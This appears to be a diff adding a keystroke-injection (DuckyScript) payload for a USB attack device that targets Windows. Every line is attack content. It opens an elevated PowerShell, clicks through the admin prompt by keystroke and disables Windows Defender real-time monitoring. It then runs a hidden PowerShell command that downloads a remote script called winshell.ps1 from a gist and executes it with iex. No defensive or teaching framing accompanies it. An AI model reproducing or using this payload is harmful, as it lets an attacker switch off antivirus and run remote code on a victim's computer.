@@ -1,0 +1,31 @@
+REM Run
+DELAY 1000
+GUI r
+DELAY 300
+
+REM open powershell
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2500
+LEFT_ARROW
+ENTER
+DELAY 2000
+
+REM Disable Windows Defender Real-Time Monitoring
+STRING Set-MpPreference -DisableRealtimeMonitoring 1
+ENTER
+DELAY 1200
+STRING exit
+ENTER
+
+REM run
+GUI r
+DELAY 500
+
+REM get script and execute
+STRING powershell -w hidden -command "iwr https://gist.githubusercontent.com/xcyraxx/bfc4e11e10b65b8888f5f2f4932b2b01/raw/548202f06e8714d5b92047c572f58dc4bd4649de/winshell.ps1 | iex"
+DELAY 50
+ENTER
+
+STRING exit
+ENTER
